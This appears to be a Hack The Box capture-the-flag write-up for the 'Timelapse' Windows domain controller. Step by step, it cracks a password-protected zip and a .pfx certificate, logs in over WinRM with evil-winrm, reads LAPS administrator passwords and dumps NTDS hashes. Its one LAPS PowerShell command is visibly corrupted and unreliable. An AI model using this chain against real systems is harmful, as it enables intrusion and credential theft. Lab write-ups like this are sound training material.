---
description: https://app.hackthebox.com/machines/Timelapse
cover: ../../../.gitbook/assets/Timelapse.png
coverY: -54.40414507772022
---

# Timelapse

## Nmap

```
sudo nmap 10.10.11.152 -Pn -p- -sS -sV

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-07-02 14:42:07Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
58212/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Starting out we check anonymous logon with `smbmap`. Where we find that "Shares" share is read only access to us.

```bash
smbmap -H '10.10.11.152' -u 'a' -p '' -d 'timelapse.htb'
```

![](<../../../.gitbook/assets/image (88).png>)

Recursively searching the share with `smbmap` reveals to us that LAPS may be installed in the environment as well as the interesting file `winrm_backup.zip.`

```bash
smbmap -H '10.10.11.152' -u 'a' -p '' -d 'timelapse.htb' -r
```

![](<../../../.gitbook/assets/image (1018).png>)

Download the file:

```bash
smbmap -H '10.10.11.152' -u 'a' -p '' -d 'timelapse.htb' -R -A .zip
```

![](<../../../.gitbook/assets/image (89).png>)

As the zip file is password protected we can utilize `zip2john` to hash the file and then crack it.

```bash
/usr/sbin/zip2john 10.10.11.152-Shares_Dev_winrm_backup.zip 
```

![](<../../../.gitbook/assets/image (83).png>)

supplying john with you `rockyou.txt` word list we find the hash is cracked quickly.

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt winrmbackup.hash 
```

![](<../../../.gitbook/assets/image (818).png>)

We are left with the file `legaccy_dev_auth.pfx`. A .pfx file is a certificate in PKCS#12 format.

![](<../../../.gitbook/assets/image (704).png>)

Again, we need to hash the `.pfx` file and crack the password.

```bash
/usr/bin/pfx2john legacyy_dev_auth.pfx >> pfx.hash
```

![](<../../../.gitbook/assets/image (689).png>)

With the .pfx file we can now look at how we can connect to the target system. It is possible to connect over WinRM by providing a public certificate and a valid private key both of which can be extracted from .pfx files.

I used the following link for guidance on how to extract this information:

**URL:** [https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)

```bash
# Extract the private key
openssl pkcs12 -in [yourfile.pfx] -nocerts -out [drlive.key]

# Extract the certificate
openssl pkcs12 -in [yourfile.pfx] -clcerts -nokeys -out [drlive.crt]

# Decrypt the private key
openssl rsa -in [drlive.key] -out [drlive-decrypted.key]
```

**Note:** You may need to connect to a TCP OpenVPN configuration for the following to connect successfully.

```bash
 evil-winrm -i '10.10.11.152' -c 'drlive.crt' -k 'drlive-decrypted.key' -S -r 'timelapse.htb' 
```

![](<../../../.gitbook/assets/image (840).png>)

![](<../../../.gitbook/assets/image (837).png>)

From here we look into the `ConsoleHost_History.txt` file and find credential information contained within.

![](<../../../.gitbook/assets/image (691).png>)

We now have the credentials for `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`

```bash
evil-winrm -i '10.10.11.152' -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S -P 5986
```

Viewing the group memberships for our current user we see we are a member of "LAPS Readers".

![](<../../../.gitbook/assets/image (683).png>)

Knowing this we can run the following `b` command to pull the local administrator password for the host DC01.

```powershell
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Objee $null } | Select-Object 'Name','ms-Mcs-AdmPwd'
```

![](<../../../.gitbook/assets/image (594).png>)

We are then able to use `Evil-WinRM` to authenticate against the target system with the LAPS password.

```bash
evil-winrm -i '10.10.11.152' -u 'administrator' -p '+K)HlT72oO(W6;W&402qD9LS' -S -P 5986
```

![](<../../../.gitbook/assets/image (602).png>)

Then grab the **root** flag.

![](<../../../.gitbook/assets/image (655).png>)

`Crackmapexec` has also been utilized with the credentials to dump the `NTDS.dit` hashes from the target system.

![](<../../../.gitbook/assets/image (784).png>)
